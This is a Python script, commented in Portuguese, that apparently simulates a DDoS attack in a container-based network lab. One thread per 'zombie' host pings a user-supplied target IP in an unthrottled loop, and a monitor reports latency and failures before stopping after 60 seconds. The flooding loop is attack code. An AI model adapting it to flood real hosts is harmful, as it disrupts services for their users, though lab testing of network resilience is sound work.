import threading
import time
from utils import (
    escolher_topologia,
    carregar_hosts,
    container_para_ip,
    executar_ping_com_estatisticas
)

def ddos_worker(origem_container, origem_ip, destino_ip, resultados):
    while True:
        resultado = executar_ping_com_estatisticas(origem_container, origem_ip, destino_ip)
        if resultado:
            resultados.append(resultado)
        else:
            resultados.append({"falha": True})
        #time.sleep(0.1)  # controle de taxa (ajustável)


def monitor_resultados(resultados, intervalo=5, duracao_total=60):
    inicio = time.time()
    rodada = 1

    while True:
        time.sleep(intervalo)
        total = len(resultados)
        falhas = sum(1 for r in resultados if "falha" in r)
        sucessos = total - falhas

        if sucessos > 0:
            latencias = [l for r in resultados if "latencias_ms" in r for l in r["latencias_ms"]]
            media = sum(latencias) / len(latencias) if latencias else 0
            print(f"Rodada {rodada}: {total} envios, {sucessos} respostas, {falhas} falhas, latência média {media:.2f}ms")
        else:
            print(f"Rodada {rodada}: {total} envios, 0 respostas, {falhas} falhas")

        resultados.clear()
        rodada += 1

        if time.time() - inicio >= duracao_total:
            print("\n⚠️  Limite de 60 segundos atingido. Encerrando o ataque...\n")
            break



def main():
    topologia = escolher_topologia()
    if not topologia:
        return

    hosts = carregar_hosts(topologia)
    print("\nHosts disponíveis:")
    print(hosts)

    alvo_ip = input("\nInforme o IP do Roteador ou Host alvo para o DDoS: ")

    resultados = []
    print(f"\nIniciando ataque DDoS ao alvo {alvo_ip} usando {len(hosts)} zumbis...\n")

    # Inicia os zumbis
    for origem_ip in hosts:
        origem_container = container_para_ip(origem_ip)
        t = threading.Thread(target=ddos_worker, args=(origem_container, origem_ip, alvo_ip, resultados), daemon=True)
        t.start()

    # Inicia monitoramento contínuo
    monitor_resultados(resultados)


if __name__ == "__main__":
    main()
